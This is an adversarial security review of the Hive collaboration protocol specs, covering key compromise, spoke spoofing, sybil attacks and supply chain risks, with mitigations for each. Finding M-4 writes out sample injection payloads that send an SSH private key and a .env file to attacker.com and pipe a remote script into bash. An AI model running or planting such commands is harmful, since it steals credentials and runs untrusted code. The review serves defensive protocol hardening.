# Adversarial Security Review: The Hive Protocol Specifications

**Reviewer:** @Steffen025 + Jeremy (Claude Code/Claude Opus 4)  
**Review Type:** Adversarial / Red Team Perspective  
**Date:** 2026-02-09  
**Repository:** mellanon/the-hive  
**Protocols Reviewed:**
- `spoke-protocol.md` (Review status)
- `operator-identity.md` (Review status)
- `trust-protocol.md` (Draft status - context only)

**Issue Reference:** mellanon/pai-collab#94

---

## Executive Summary

**VERDICT:** APPROVE WITH COMMENTS

The Hive's spoke-protocol and operator-identity specifications demonstrate sophisticated security architecture with defense-in-depth principles. The cryptographic foundation (Ed25519 SSH signing), four-layer compliance verification model, and pluggable identity providers show thoughtful design. The protocols acknowledge their own threat surfaces explicitly.

However, from an adversarial perspective, several attack vectors exist that could compromise the trust model. These range from **CRITICAL** (key compromise scenarios with inadequate remediation), to **MEDIUM** (metadata leakage and supply chain risks), to **LOW** (edge cases and hardening opportunities).

The protocols are production-ready with the understanding that no distributed trust system is perfectly secure. The critical findings require mitigation before widespread adoption, particularly around key lifecycle management and cross-hub identity portability.

**Key Strength:** The protocol treats commit signing as first-class identity proof rather than an optional add-on. This cryptographic binding is the strongest element of the design.

**Key Weakness:** The trust model assumes honest operators and relies heavily on social mechanisms (vouching, feedback) that are gameable at scale. The cryptographic foundation is strong, but the trust scoring layer above it has exploitable dynamics.

---

## Methodology

This review employed static analysis of the protocol specifications using an adversarial threat modeling approach:

1. **Attack Surface Enumeration** — Identified all trust boundaries and data flows
2. **Threat Actor Profiling** — Modeled attackers with different capabilities (compromised operator, malicious maintainer, nation-state)
3. **Attack Scenario Construction** — Developed concrete exploitation paths for each threat
4. **Verification Gap Analysis** — Examined what can/cannot be cryptographically verified
5. **Social Engineering Assessment** — Analyzed game-theoretic exploits in reputation systems

**Important Disclaimer:** This is a theoretical/static analysis of protocol specifications. No running implementation was tested. Attack vectors are derived from spec analysis, threat modeling, and established cryptographic system vulnerabilities. Some attacks may be mitigated by implementation details not specified in the protocol docs.

**Review Focus:** The protocols explicitly mention they are at "Review" status. This review focuses on the spoke-protocol and operator-identity specs, with trust-protocol referenced for context only (it remains in "Draft" status).

---

## Findings

### CRITICAL

#### C-1: Key Compromise Remediation is Insufficient

**Threat:** An operator's Ed25519 private key is compromised (stolen laptop, malware, social engineering).

**Protocol Response (operator-identity.md lines 140-148):**
```
Key rotation: Generate new key → Submit PR updating spoke manifest + allowed-signers
Key loss: Same as rotation
Revocation: Maintainer removes operator from allowed-signers
```

**Attack Vector:**

1. Attacker steals operator's private key
2. Attacker can sign commits as the operator indefinitely
3. Operator submits PR to rotate key
4. **Problem:** Old commits remain valid in git history
5. **Problem:** Attacker can continue signing commits with the old key until maintainer updates `allowed-signers`
6. **Problem:** No revocation timestamp — git signatures don't expire, so old valid signatures look identical to new valid signatures

**Exploitation Timeline:**
```
T0: Attacker steals operator's key
T0+1h: Attacker begins signing malicious commits
T0+2h: Operator notices compromise, submits key rotation PR
T0+24h: Maintainer reviews and merges rotation PR
Gap: 24 hours where attacker has valid signing authority
Residual: All historical signatures remain valid forever
```

**Impact:** An attacker with a compromised key can:
- Submit malicious PRs that pass CI Gate 1 (signing verification)
- Impersonate the operator across all hives they're members of
- Contaminate the operator's trust score with malicious contributions
- No forensic way to distinguish attacker's signed commits from operator's signed commits

**Missing Protocol Elements:**
- No certificate revocation list (CRL) mechanism
- No timestamping service to prove "signature created before revocation"
- No emergency revocation path (all revocations go through PR review)
- No multi-device key coordination (spoke manifest only has ONE public key)

**Severity Justification:** This is CRITICAL because key compromise is not a theoretical threat — it's a realistic operational scenario (phishing, malware, insider threat). The protocol provides cryptographic identity but no cryptographic revocation, leaving a gap between "operator reports compromise" and "network stops trusting the key."

**Recommendation:**
1. Add timestamping to spoke manifest: `identity.signing.keyRegistered: <ISO 8601>` — when the key was first registered
2. Add revocation timestamp: When a key is removed from `allowed-signers`, record the timestamp in a revocation log
3. CI verification should check: `commit.timestamp < key.revocationTimestamp` — reject commits signed after revocation
4. Add emergency revocation mechanism: Maintainer can immediately disable a key without full PR review (with audit trail)
5. Consider supporting multiple keys per operator (one per device) with per-key revocation

**Alternative Mitigation:** Document this as a known limitation and recommend short key rotation schedules (e.g., every 90 days) to limit exposure window.

---

#### C-2: Spoke Spoofing via Repo Compromise

**Threat:** An attacker gains write access to a spoke's public repository (GitHub account compromise, leaked token, insider threat).

**Protocol Model (spoke-protocol.md lines 96-103):**
```
PUBLIC SPOKES (default):
  Spoke: init → status → validate → commit → push (to spoke repo)
  Hub:   pull → fetches .collab/ from spoke repos via gh api → dashboard
```

**Attack Vector:**

1. Attacker compromises GitHub account of operator `@alice`
2. Attacker has write access to `alice/project-spoke` repository
3. Attacker modifies `.collab/manifest.yaml` and `.collab/status.yaml`
4. **Protocol Defense:** Commits must be signed with operator's key
5. **Attack Bypass:** Attacker uses GitHub's "Web UI editing" or API to push unsigned commits, OR signs with a different key, OR forces a merge from another account

**What the Hub Sees:**
```
Pull from alice/project-spoke
├── .collab/manifest.yaml — modified
├── .collab/status.yaml — shows false "all tests passing"
└── Git log shows unsigned commit or commit signed with unknown key
```

**Protocol Defense (spoke-protocol.md lines 115-120):**
```bash
# Verify commit signature against hive's allowed-signers
git log --show-signature --format='%H %G?' origin/main..HEAD | grep -v ' G$' 
  && echo "UNSIGNED COMMITS FOUND" && exit 1
```

**Defense Evaluation:**
- ✅ **IF** hub runs this verification on pull: unsigned commits are detected
- ❌ **IF** hub naively trusts repo content without signature verification: attacker wins
- ⚠️ **CRITICAL ASSUMPTION:** The protocol ASSUMES the hub runs signature verification, but this is stated as a "should" not a "must"

**Second Attack Vector — Repo Replacement:**

1. Attacker compromises operator's GitHub account
2. Attacker deletes `alice/project-spoke` repo
3. Attacker creates NEW repo with same name
4. Attacker initializes `.collab/` with spoofed data
5. Hub's next `pull` fetches from the new repo

**What Hub Sees:** A repo at the expected URL with `.collab/` data. Signature verification should fail (different key), but if hub doesn't enforce signature verification on first pull, it may cache the spoofed data.

**Third Attack Vector — Fork-and-Replace:**

1. Attacker forks `alice/project-spoke`
2. Attacker modifies `.collab/` in their fork
3. Attacker convinces hub maintainer to update `PROJECT.yaml` to point to attacker's fork
4. Or: If hub discovers spokes automatically via GitHub API search, attacker's fork may be pulled alongside the real spoke

**Impact:**
- False status reporting (hub dashboard shows spoofed data)
- Trust score manipulation (attacker claims false achievements)
- Hub makes decisions based on false spoke state

**Severity Justification:** CRITICAL if hub implementations don't enforce signature verification on pull. The protocol spec says verification "should" happen, but doesn't mandate it. A naive hub implementation that trusts repo content without signature verification is fully exploitable.

**Recommendation:**
1. **Strengthen protocol requirement:** Change spoke-protocol.md line 115 from "Hub CI should enforce" to "Hub CI **MUST** enforce"
2. Add hub-side verification requirement: `hive-spoke pull` command MUST reject unsigned or incorrectly signed commits
3. Add spoke provenance verification: Hub should track the first-seen public key for each spoke and alert on key changes (TOFU model - Trust On First Use)
4. Add spoke repo pinning: `PROJECT.yaml` should include `source.commit` hash or `source.keyFingerprint` to prevent silent repo replacement
5. Document the threat model: Explicitly state that spoke security depends on GitHub account security and recommend 2FA + hardware keys

---

#### C-3: Cross-Hub Identity Theft via Key Reuse

**Threat:** An operator joins multiple hives with the same Ed25519 key. Attacker compromises the operator in one hive and leverages the same identity across all hives.

**Protocol Model (operator-identity.md lines 280-290):**
```
Tier 1: Public Identity (visible to all hives)
  signing:
    publicKey: "ssh-ed25519 AAAA..."  # Ed25519 SSH public key
    fingerprint: "SHA256:+sgg04W..."

One profile, multiple identities, portable across hives.
```

**Attack Vector:**

1. Operator `@bob` is member of HiveA, HiveB, HiveC with same SSH key
2. Attacker compromises `@bob`'s key (or GitHub account in HiveA)
3. HiveA detects compromise and revokes key from `allowed-signers`
4. **Problem:** HiveB and HiveC are not notified of the revocation
5. Attacker continues to operate as `@bob` in HiveB and HiveC
6. No protocol mechanism for cross-hive revocation broadcast

**Exploitation Scenario:**
```
@bob in HiveA (enterprise hive, high security)
  ├── Compromised via phishing
  ├── HiveA revokes key immediately
  └── Attacker loses access to HiveA

@bob in HiveB (community hive, lower scrutiny)
  ├── Same key, still in allowed-signers
  ├── Attacker submits malicious PR
  └── Passes signature verification (key not revoked in HiveB)

@bob in HiveC (public hive, minimal review)
  ├── Same key, still valid
  └── Attacker maximizes damage before detection
```

**Impact:**
- Single point of compromise, multiple points of exploitation
- Blast radius of key compromise = all hives where operator is a member
- No protocol-level revocation propagation

**Protocol Gap:** The operator-identity spec promotes "portable identity" (lines 280-290) but doesn't address the security implications of key reuse across trust boundaries.

**Severity Justification:** CRITICAL for operators with high-value access across multiple hives. The protocol encourages key portability without providing revocation propagation, creating a systemic vulnerability.

**Recommendation:**
1. **Add cross-hive revocation registry:** A shared (opt-in) revocation list where hives can publish and subscribe to key revocations
2. **Recommend per-hive keys:** Documentation should advise operators to use different keys for different hives (or different key types: one for high-security hives, one for community hives)
3. **Add revocation notification protocol:** When a key is revoked in one hive, the operator's `operator.yaml` should be updated with a `revoked_keys` section visible to all hives
4. **Implement key capability scoping:** Keys could be scoped to specific hives in the signing metadata (though this requires changes to git's SSH signing format)

**Alternative Mitigation:** Document this as a known limitation and recommend that high-security hives audit operators' cross-hive memberships during onboarding.

---

### MEDIUM

#### M-1: Metadata Leakage via status.yaml

**Threat:** The spoke `status.yaml` exposes operational intelligence that could be used for competitive analysis or targeted attacks.

**Protocol Specification (spoke-protocol.md lines 56-71):**
```yaml
status.yaml (auto-generated):
  generatedAt: <ISO 8601>
  phase: <specify | build | harden | contrib-prep | review | shipped | evolving>
  tests:
    passing: <int>
    failing: <int>
  git:
    branch: <string>
    lastCommit: <ISO 8601 date>
    dirty: <boolean>
    behindRemote: <int>
```

**Acknowledged Risk (spoke-protocol.md lines 124-129):**
```
Metadata exposure: `git.dirty` and `git.behindRemote` expose operational state
  — consider hashing instead of exposing raw values
```

**Attack Vectors:**

1. **Competitive Intelligence:**
   - Attacker scrapes `status.yaml` from competitor's public spoke
   - Learns: project phase, velocity (commit frequency), stability (failing tests)
   - Can infer: launch timelines, technical debt, team capacity

2. **Targeted Attack Timing:**
   - Attacker monitors `tests.failing` count
   - When `failing` spikes, attacker knows the team is in crisis mode
   - Launches social engineering attack during high-stress period
   - Or: Times a competing product launch when competitor is in "harden" phase

3. **Branch Discovery:**
   - `git.branch: "secret-enterprise-feature"` leaks feature roadmap
   - `git.behindRemote: 50` indicates operator is behind on sync (potential stale dependencies)

4. **Operational Fingerprinting:**
   - Pattern analysis of `generatedAt` timestamps reveals work schedule
   - `dirty: true` indicates uncommitted changes (operator may be working on sensitive data locally)

**Impact:**
- Business intelligence leakage
- Attack surface reconnaissance
- Operational security compromise

**Severity Justification:** MEDIUM because the data is not directly exploitable (no credentials, no code), but provides actionable intelligence for adversaries. The protocol acknowledges this risk but doesn't enforce mitigation.

**Recommendation:**
1. **Make operational fields optional:** `status.yaml` schema should allow operators to omit `git.dirty`, `git.behindRemote`, `git.branch` if they choose
2. **Add privacy mode:** `hive-spoke status --privacy-mode` generates status.yaml with aggregated/hashed operational data
3. **Implement data minimization:** Only include fields that are necessary for hub dashboard functionality
4. **Add operator control:** Spoke manifest should have a `privacy.metadata` section where operator declares what status fields they're willing to expose

**Example Privacy-Safe Schema:**
```yaml
status.yaml (privacy mode):
  generatedAt: <ISO 8601>
  phase: <public phase name>
  health: <green | yellow | red>  # Aggregated test status
  git:
    lastCommitHash: <hash of commit timestamp>  # Proves freshness without exposing timestamp
    syncStatus: <synced | diverged>  # Binary instead of count
```

---

#### M-2: Supply Chain Attack via GitHub Actions

**Threat:** An attacker compromises the hub's CI pipeline (GitHub Actions) to inject malicious verification logic.

**Protocol Specification (spoke-protocol.md lines 115-120):**
```bash
# Verify commit signature against hive's allowed-signers
git config gpg.ssh.allowedSignersFile .hive/allowed-signers
git log --show-signature --format='%H %G?' origin/main..HEAD | grep -v ' G$'
```

**Acknowledged Risk (spoke-protocol.md lines 124-129):**
```
Supply chain: GitHub Actions must pin dependencies with integrity hashes
```

**Attack Vectors:**

1. **Dependency Confusion:**
   - Hub's `.github/workflows/verify-spoke.yml` uses `actions/checkout@v3`
   - Attacker publishes malicious `actions/checkout@v3.1` with backdoor
   - Hub's workflow auto-updates and uses malicious action

2. **Action Injection:**
   - Hub uses unpinned action: `uses: third-party/spoke-validator@latest`
   - Third-party account compromised
   - Malicious version published as "latest"
   - Hub's CI now runs attacker-controlled code

3. **Script Injection via PR:**
   - Attacker submits PR with malicious `.github/workflows/spoke-ci.yml`
   - If workflow runs on PR (not just on merge), attacker's code executes in hub's CI environment
   - Attacker exfiltrates `GITHUB_TOKEN` or other secrets

**Impact:**
- Attacker can bypass signature verification (modify the verification script)
- Attacker can steal hub secrets (API keys, deploy tokens)
- Attacker can inject backdoors into merged code

**Severity Justification:** MEDIUM because GitHub provides security features (required status checks, CODEOWNERS), but the protocol spec doesn't mandate their use. Hub implementations that follow GitHub security best practices are protected; those that don't are vulnerable.

**Recommendation:**
1. **Add CI security requirements to spoke-protocol.md:** Document that hub CI MUST:
   - Pin all GitHub Actions to commit SHA (not tags or branches)
   - Use Dependabot or Renovate to monitor action updates
   - Require signed commits from workflow contributors
   - Use `pull_request_target` carefully (run untrusted code in isolated environment)

2. **Add reference CI configuration:** Provide a hardened `.github/workflows/spoke-verification.yml` template in the hive-spoke repo

3. **Add verification of verification:** Hub should log CI verification results to an append-only audit trail. If verification logic is compromised, historical logs show when it diverged.

**Example Hardened Workflow:**
```yaml
name: Spoke Verification
on:
  pull_request:
    types: [opened, synchronize]
jobs:
  verify:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@a81bbbf8298c0fa03ea29cdc473d45769f953675  # Pin to commit SHA
        with:
          fetch-depth: 0  # Need full history for signature verification
      - name: Verify Signatures
        run: |
          # Use inline script, not external dependency
          git config gpg.ssh.allowedSignersFile .hive/allowed-signers
          UNSIGNED=$(git log --show-signature --format='%H %G?' origin/main..HEAD | grep -v ' G$' | wc -l)
          if [ "$UNSIGNED" -gt 0 ]; then
            echo "Found $UNSIGNED unsigned commits"
            exit 1
          fi
```

---

#### M-3: Trust Score Gaming via Sybil Attacks

**Threat:** An attacker creates multiple operator identities to manipulate trust scores and badge systems.

**Protocol Model (trust-protocol.md lines 373-413):**
```
Trust scoring based on positive/neutral/negative feedback
Vouching system allows trusted operators to vouch for new operators
Badge system (Hive Star, Guardian, Architect, Catalyst) based on activity thresholds
```

**Attack Vectors:**

1. **Vouching Ring:**
   - Attacker creates 5 GitHub accounts (operators A, B, C, D, E)
   - Operator A joins hive, builds legitimate reputation to "trusted" status
   - Operator A vouches for B, C, D, E
   - All five now have accelerated onboarding
   - They submit low-effort PRs and review each other's work positively
   - Inflate each other's feedback scores

2. **Badge Farming:**
   - To earn "Hive Star" badge: 10+ completed items, 90%+ positive, 4.8+ rating (trust-protocol.md lines 570-581)
   - Attacker's sybil ring collaborates on trivial work items
   - They complete 10+ items by rubber-stamping each other
   - All maintain 90%+ positive feedback through mutual positive reviews
   - Multiple sybils earn Hive Star badge

3. **Double-Blind Review Gaming:**
   - Protocol uses double-blind reviews to prevent retaliation (trust-protocol.md lines 534-546)
   - Attacker coordinates sybils off-chain (Signal, Discord)
   - Agrees: "We'll both give 5 stars before submitting"
   - Double-blind mechanism doesn't prevent pre-coordination

4. **Cross-Hive Reputation Laundering:**
   - Attacker builds high trust score in low-scrutiny public hive
   - Uses that reputation as social proof when joining high-security hive
   - Protocol shows: "@attacker — 92% positive (50 ratings) in public-tools"
   - Maintainer of high-security hive is influenced by the cross-hive reputation

**Impact:**
- Trust scores become unreliable signals
- Badges lose meaning
- Vouching system enables sybil entry at scale
- Maintainers cannot distinguish legitimate from gamed reputations

**Severity Justification:** MEDIUM because sybil attacks are detectable with analysis (graph analysis of review patterns, vouch networks, cross-hive activity correlation), but the protocol doesn't specify sybil resistance mechanisms.

**Recommendation:**
1. **Add graph analysis to trust scoring:** Hub should detect review reciprocity patterns (A always reviews B's PRs, B always reviews A's PRs) and flag for maintainer review
2. **Limit vouching network depth:** Operators can only vouch for people they haven't been vouched by (prevents circular vouching)
3. **Add vouch cooldown:** Can only vouch once per 30 days per hive (prevents rapid sybil onboarding)
4. **Weight cross-hive reputation by hive reputation:** A 92% score in a low-trust hive counts less than a 92% score in a high-trust hive
5. **Add maintainer override:** Badges should have a "subject to maintainer review" status if awarded within first 90 days of membership (prevents immediate gaming)

**Protocol Enhancement:**
```yaml
# hive.yaml
trust:
  sybil_resistance:
    max_vouch_reciprocity: 0.3  # Max 30% of reviews can be reciprocal
    vouch_cooldown_days: 30
    badge_provisional_period_days: 90
    cross_hive_weight_by_hive_trust: true
```

---

#### M-4: Command Injection via status.test Field

**Threat:** The spoke manifest's `status.test` field is executed by the hub without sanitization.

**Protocol Specification (spoke-protocol.md lines 44-46):**
```yaml
status:
  test: <test command>
  healthCheck: <health check command>
```

**Acknowledged Risk (spoke-protocol.md lines 124-129):**
```
Command injection: manifest.yaml `status.test` field must be whitelisted, 
not executed directly
```

**Attack Vector:**

1. Attacker submits spoke manifest with malicious test command:
```yaml
status:
  test: "npm test; curl https://attacker.com/exfil?data=$(cat ~/.ssh/id_ed25519 | base64)"
```

2. If hub naively executes the command:
   - `npm test` runs normally (appears legitimate)
   - Command injection exfiltrates hub operator's SSH key

3. Alternative payload:
```yaml
status:
  test: "pytest && curl -F 'file=@.env' https://attacker.com/collect"
healthCheck: "curl https://malicious.com/install.sh | bash"
```

**Impact:**
- Remote code execution on hub operator's machine
- Credential theft
- Supply chain compromise (if test command has write access to hub repo)

**Severity Justification:** MEDIUM because the protocol explicitly warns against this (lines 124-129), but doesn't specify the whitelisting mechanism. Hub implementations that don't read the security considerations section are vulnerable.

**Recommendation:**
1. **Remove executable test field entirely:** `status.test` should be a human-readable string only, never executed by the hub
2. **If test execution is required:** Specify a sandboxed execution environment (Docker container with no network, no host filesystem access)
3. **Add test command validation:** Hub should reject manifests with shell metacharacters in test commands
4. **Document the threat model explicitly:** Add a "DO NOT EXECUTE" warning in the schema definition

**Safer Schema:**
```yaml
status:
  test:
    description: "pytest -v tests/"  # Human-readable only
    lastRun: <ISO 8601>
    result: <passed | failed>
    output_summary: "42 tests passed"  # Not full output (prevents exfil)
```

**Alternative:** If test execution is desired, use a whitelist approach:
```yaml
# hive.yaml
spoke_validation:
  allowed_test_commands:
    - "npm test"
    - "pytest"
    - "cargo test"
    - "go test ./..."
  # Reject any manifest with test command not in whitelist
```

---

#### M-5: SSH Key Fingerprint Collision (Birthday Attack)

**Threat:** An attacker generates an SSH key pair with a fingerprint collision to impersonate an operator.

**Protocol Model (operator-identity.md lines 162-165):**
```yaml
signing:
  publicKey: "ssh-ed25519 AAAA..."
  fingerprint: "SHA256:+sgg04W..."
```

**Attack Analysis:**

Ed25519 uses SHA-256 for fingerprints. A birthday attack on SHA-256 requires ~2^128 operations to find a collision.

**Current Computational Reality:**
- SHA-256 collision: ~2^128 operations
- Bitcoin mining network: ~300 EH/s (exahashes/second) = ~2^68 operations/second
- Time to break SHA-256: ~2^60 seconds = 36 billion years

**Conclusion:** This is NOT a practical attack with current or near-future technology.

**However:** If SHA-256 is weakened in the future (quantum computing, cryptanalysis breakthrough), the protocol has no migration path.

**Severity Justification:** MEDIUM (low probability, high impact). The protocol is currently secure, but has no agility mechanism if SHA-256 is broken.

**Recommendation:**
1. **Add hash algorithm version:** `fingerprint: "SHA256:..."`  → `fingerprint: "v1-SHA256:..."` to enable future algorithm changes
2. **Add key type version:** `publicKey` format should include algorithm identifier: `"v1-ssh-ed25519 AAAA..."`
3. **Document migration path:** If SHA-256 is weakened, the protocol should specify how to migrate to SHA-3 or BLAKE3
4. **Add double-signature support:** During migration, operators can sign with both old and new keys

**Note:** This finding is included for completeness, not urgency. The protocol is secure against this attack for the foreseeable future.

---

### LOW

#### L-1: Spoke Discovery via PROJECT.yaml Poisoning

**Threat:** An attacker submits a PR to the hub with a `PROJECT.yaml` pointing to a malicious spoke.

**Protocol Model (spoke-protocol.md lines 229-231):**
```
How does a spoke register with a hub?
  — The hub discovers spokes via `PROJECT.yaml` → `source.repo` fields.
```

**Attack Vector:**

1. Attacker submits PR to hub: `projects/malicious-project/PROJECT.yaml`
```yaml
name: Malicious Project
source:
  repo: attacker/malware-spoke
  branch: main
```

2. Hub's `hive-spoke pull` command fetches from `attacker/malware-spoke`
3. If hub doesn't validate the repo before fetching, attacker's `.collab/` data is processed

**Impact:**
- Hub processes untrusted data from arbitrary repos
- Potential for malformed YAML attacks (billion laughs, recursive expansion)
- Potential for social engineering (attacker's spoke appears legitimate in hub dashboard)

**Severity Justification:** LOW because hub maintainers review all PRs before merge (Layer 3 fork-and-PR isolation). This is a social engineering vector, not a technical exploit.

**Recommendation:**
1. **Add spoke allowlist:** Hub should have a `.hive/trusted-spokes` list. Only fetch from repos on the allowlist.
2. **Add first-fetch approval:** When a new spoke repo is added to `PROJECT.yaml`, hub should require explicit maintainer approval before `hive-spoke pull` fetches from it.
3. **Add spoke provenance:** `PROJECT.yaml` should include `source.firstSeen: <ISO 8601>` and `source.addedBy: <handle>` for audit trail.

---

#### L-2: Open Question #2 (spoke-protocol.md line 236) — Multi-Hub Projection

**Finding:** The protocol leaves "multi-hub projection" as an open question: "Can one spoke project to multiple hives simultaneously?"

**Security Implications:**

If multi-hub is supported, attack surface increases:
- Spoke must maintain multiple `allowed-signers` files (or reference multiple hub repos)
- Cross-hub revocation becomes critical (see C-3)
- Spoke status updates propagate to multiple hives (increased metadata exposure)

**Recommendation:**
1. **Explicitly support multi-hub:** Add `hub: [org/repo1, org/repo2]` array syntax to manifest.yaml
2. **Or explicitly forbid multi-hub:** Document that each spoke projects to exactly one hub, and operators must create separate spokes for separate hives
3. **Add cross-hub isolation:** If multi-hub is supported, spoke should be able to expose different status.yaml to different hubs (privacy control)

---

#### L-3: Open Question #3 (spoke-protocol.md line 237) — Inaccessible Repo Handling

**Finding:** The protocol leaves inaccessible repos as an open question: "How should the hub handle spoke repos that become inaccessible? (deleted, made private, renamed)"

**Security Implications:**

If hub doesn't handle this gracefully:
- Dashboard shows stale data (security/operational confusion)
- Attacker could delete repo to hide negative feedback
- Hub may cache old data indefinitely (attacker can "erase" past violations)

**Recommendation:**
1. **Add spoke lifecycle states:** `active | archived | deleted | inaccessible`
2. **Cache last-known state:** If repo becomes inaccessible, hub retains last successfully pulled data with status "last seen: <timestamp>"
3. **Add removal policy:** Spoke marked `inaccessible` for 30 days is automatically archived (no longer shown in dashboard)
4. **Prevent erasure:** Deleting a spoke repo does NOT delete the operator's trust score or feedback history

---

#### L-4: Private Spoke PR Attack Surface

**Threat:** Private spokes that use the PR fallback mechanism expose spoke data to the hub repo.

**Protocol Model (spoke-protocol.md lines 99-103):**
```
PRIVATE SPOKES (fallback):
  Spoke: init → status → validate → publish → PR created on hub
  Hub:   maintainer merges PR → .collab/ persisted in hub repo
```

**Security Consideration:**

When a private spoke publishes via PR:
- Hub repo now contains a copy of the spoke's `.collab/` data
- If hub repo is compromised, all private spoke data is exposed
- Private spoke metadata is no longer private (visible to anyone with hub repo access)

**Severity Justification:** LOW because this is a documented tradeoff (private spokes must use PR fallback). Operators who need privacy should use public repos with access controls.

**Recommendation:**
1. **Document the privacy tradeoff:** Clarify in spoke-protocol.md that PR fallback exposes spoke data to hub repo
2. **Add encryption option:** Private spokes could encrypt `.collab/status.yaml` with hub's public key (manifest.yaml remains plaintext for discoverability)
3. **Recommend public + private pattern:** Operators should use public spoke repos with minimal data, and keep sensitive data in separate private repos

---

#### L-5: Operator Profile Tier Boundary Enforcement

**Threat:** An operator publishes Tier 2 (hive-scoped) data in Tier 1 (public), exposing private information.

**Protocol Model (operator-identity.md lines 156-218):**
```
Tier 1: Public Identity (visible to all hives)
Tier 2: Hive-Scoped (visible within joined hives)
Tier 3: Private (local blackboard only, never published)
```

**Attack Vector:**

Operator misconfigures `operator.yaml` and includes Tier 2 data in Tier 1 section:
```yaml
# operator.yaml (WRONG)
handle: alice
skills: [security, backend]
hives:  # This should NOT be in Tier 1
  - hive: enterprise-corp/secure-tools
    role: maintainer
    trust_zone: maintainer
```

Now all hives can see that `alice` is a maintainer in `enterprise-corp/secure-tools`, which may be sensitive.

**Impact:**
- Privacy violation
- Competitive intelligence leakage
- Social engineering vector (attacker targets operators in high-value hives)

**Severity Justification:** LOW because this is operator error, not protocol vulnerability. However, the protocol could provide better guardrails.

**Recommendation:**
1. **Add schema validation:** `hive-spoke validate` should enforce tier boundaries (reject manifests with Tier 2 fields in Tier 1 section)
2. **Add separation:** Use separate files for each tier:
   - `operator-public.yaml` (Tier 1)
   - `operator-hive.yaml` (Tier 2, stored per-hive)
   - No Tier 3 file (stays in local blackboard only)
3. **Add linting:** Hub CI should reject PRs with malformed operator profiles

---

#### L-6: Status Freshness Threshold Not Specified

**Threat:** Spoke status becomes stale, but hub continues to trust it.

**Protocol Model (spoke-protocol.md lines 170-171):**
```
Stale `status.yaml` (`generatedAt` older than threshold) → Gate 4: Governance
```

**Gap:** The protocol mentions a "threshold" but doesn't specify the value.

**Impact:**
- Hub may show 90-day-old status as current
- Operators can "freeze" their status at a favorable point and stop updating
- Trust decisions based on stale data

**Severity Justification:** LOW because this is a quality-of-life issue, not a security vulnerability. However, it degrades trust signal reliability.

**Recommendation:**
1. **Specify default threshold:** `status.yaml` is stale if `generatedAt` is older than 7 days (or hub-configurable in `hive.yaml`)
2. **Add staleness indicator:** Hub dashboard should show "⚠️ Status last updated 14 days ago" next to stale spokes
3. **Add automatic demotion:** If spoke is stale for 30+ days, operator's trust zone is automatically demoted to `untrusted` until they update

---

### OBSERVATIONS (Positive Aspects)

#### O-1: Commit Signing as First-Class Identity

**Strength:** The protocol treats Ed25519 SSH commit signing as the primary identity mechanism, not an optional add-on.

**Why This Matters:** Most collaboration platforms (GitHub, GitLab) treat commit signing as a "nice to have" feature. The Hive makes it mandatory, creating a cryptographic foundation for all trust decisions.

**Evidence:**
- spoke-protocol.md line 15: "Signed by default — All spoke updates are commit-signed"
- operator-identity.md lines 104-150: Full specification of SSH signing setup, verification, and lifecycle
- trust-protocol.md lines 199-220: Commit signing as trust foundation

**Impact:** This is the strongest security element of the protocol. It prevents spoke spoofing, enables non-repudiation, and provides an audit trail that survives platform compromise.

---

#### O-2: Four-Layer Compliance Verification

**Strength:** The protocol uses a sophisticated four-layer verification model (Provable, Detectable, Attested, Structural) that acknowledges different trust levels.

**Why This Matters:** Most trust systems are binary (trusted/untrusted). The Hive recognizes that not everything is cryptographically provable, and designs for "graduated certainty."

**Evidence:**
- spoke-protocol.md lines 130-227: Full specification of four verification layers
- Line 159: "Mathematical certainty" for Layer 1 (provable)
- Line 173: "Absence of evidence IS evidence of absence" for Layer 2 (detectable)
- Line 186: "Not proof — but lying is traceable" for Layer 3 (attested)

**Impact:** This nuanced approach allows the protocol to scale beyond cryptographic verification while maintaining trust accountability.

---

#### O-3: Defense in Depth with Reflex Pipeline

**Strength:** The trust protocol specifies six defense layers with clear boundary enforcement and fallback mechanisms.

**Why This Matters:** A single security control is a single point of failure. The reflex pipeline ensures that if Layer 1 (pre-commit) is bypassed, Layer 2 (CI gate) catches it.

**Evidence:**
- trust-protocol.md lines 20-33: Six defense layers specification
- Lines 65-151: Four reflexes firing at every boundary crossing
- Line 134: "Defense in depth" — Reflex B catches what Reflex A missed

**Impact:** This makes the protocol resilient to partial failures. An operator who skips local setup is caught at the hub. A compromised hub CI is caught by the operator's local verification.

---

#### O-4: Observable Setup Signals (Not Self-Reported)

**Strength:** The protocol uses observable evidence (signed commits, CI results) rather than self-reported checkboxes for onboarding validation.

**Why This Matters:** Trust systems that rely on "I confirm I set up security correctly" are vulnerable to negligence and fraud. Observable signals are verifiable.

**Evidence:**
- trust-protocol.md lines 221-242: Three setup signals (signing verified, secret scanning active, content filter active)
- Line 229: "A signed first PR is cryptographic proof they completed the signing setup"
- Line 234: "Secret scanning is observable through absence" (CI never catches secrets = pre-commit hook works)

**Impact:** Maintainers can verify operator setup without trusting self-reports. This reduces onboarding friction while maintaining security.

---

#### O-5: Git as Trust Ledger (Not Blockchain)

**Strength:** The protocol uses git history as an append-only audit trail rather than introducing blockchain complexity.

**Why This Matters:** Many distributed trust systems reach for blockchain. The Hive recognizes that git already provides immutable history, cryptographic integrity (via commit signing), and distributed verification.

**Evidence:**
- trust-protocol.md line 18: "Git-based. The trust ledger is auditable through git history, not blockchain."
- spoke-protocol.md lines 115-120: Signature verification via `git log --show-signature`
- trust-protocol.md line 558: "Feedback is append-only... The git history IS the audit trail"

**Impact:** This makes the protocol implementable with existing tools, auditable with standard git commands, and free from blockchain scaling/energy concerns.

---

#### O-6: Explicit Acknowledgment of Threats

**Strength:** The protocol specifications explicitly acknowledge threat surfaces and mitigation limitations.

**Why This Matters:** Security protocols that pretend to be invulnerable are dangerous. The Hive's specifications admit gaps and open questions, which invites community review and improvement.

**Evidence:**
- spoke-protocol.md lines 105-129: Dedicated "Security Considerations" section
- Lines 124-129: Explicit enumeration of command injection, supply chain, and metadata exposure threats
- Lines 233-238: "Open Questions" section acknowledges unresolved design issues
- trust-protocol.md line 186: "Verification asymmetry is intentional" — acknowledges that not everything can be proven

**Impact:** This transparency builds trust with implementers and enables informed risk decisions.

---

## Attack Scenarios

### Scenario 1: Key Compromise → Cross-Hive Exploitation

**Attacker Profile:** Opportunistic, low-skill (phishing)

**Target:** Operator `@charlie`, member of 3 hives (public, community, enterprise)

**Attack Path:**

1. **T0 — Compromise:** Attacker sends phishing email to `@charlie` with fake "GitHub security alert" link
2. **T0+10m — Credential Theft:** `@charlie` enters credentials on attacker's fake site, attacker steals password
